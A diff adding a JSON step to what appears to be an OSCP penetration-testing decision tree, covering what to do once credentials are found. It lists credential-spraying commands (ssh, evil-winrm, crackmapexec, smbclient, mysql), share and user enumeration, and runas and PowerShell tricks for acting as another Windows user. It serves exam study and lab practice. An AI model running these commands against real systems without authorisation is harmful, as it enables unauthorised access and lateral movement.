@@ -1,0 +1,26 @@
+{
+  "id": "creds_found",
+  "phase": "CREDS",
+  "title": "Credentials Found",
+  "body": "Spray those creds on every service immediately. Password reuse is the most consistent win on OSCP. Same user, same password, different service.",
+  "cmd": "# Try everything\nssh user@$ip\nevil-winrm -i $ip -u user -p 'password'\ncrackmapexec smb $ip -u user -p 'password'\ncrackmapexec winrm $ip -u user -p 'password'\nsmbclient //$ip/share -U user\nftp $ip   # try creds manually\nmysql -u user -p'password' -h $ip\n\n# Check all share access with creds\ncrackmapexec smb $ip -u user -p 'password' --shares\ncrackmapexec smb $ip -u user -p 'password' --users\ncrackmapexec smb $ip -u user -p 'password' --groups\n\n# ── RUNAS — open PS as another user (Windows, requires GUI) ──\n# Basic runas — opens cmd window as target user\nrunas /user:HOSTNAME\targetuser cmd\n\n# Open PowerShell as target user\nrunas /user:HOSTNAME\targetuser powershell\n\n# With saved credentials (if cmdkey has them stored)\nrunas /savecred /user:HOSTNAME\targetuser powershell\n\n# Domain user\nrunas /user:DOMAIN\targetuser powershell\n\n# No GUI? Use PowerShell credential object instead:\n# (works in bind shell / WinRM)\n# pw = ConvertTo-SecureString \"FOUND_PASSWORD\" -AsPlainText -Force\n# cred = New-Object PSCredential(\"HOSTNAME/targetuser\", pw)\n# Start-Process powershell -Credential cred\n\n# Then in the new window — verify you are the new user:\nwhoami\nwhoami /groups\nwhoami /priv\n\n# Re-enumerate as new user — permissions change!\n# Run full enum again — files readable by dave may not be\n# readable by steve and vice versa (Module 17.1.3 pattern)",
+  "warn": null,
+  "choices": [
+    {
+      "label": "SSH / shell access — Linux machine",
+      "next": "linux_post_exploit"
+    },
+    {
+      "label": "WinRM / RDP / SMB — Windows machine",
+      "next": "windows_post_exploit"
+    },
+    {
+      "label": "Web access only",
+      "next": "file_upload"
+    },
+    {
+      "label": "Spray these creds everywhere NOW",
+      "next": "cred_reuse"
+    }
+  ]
+}
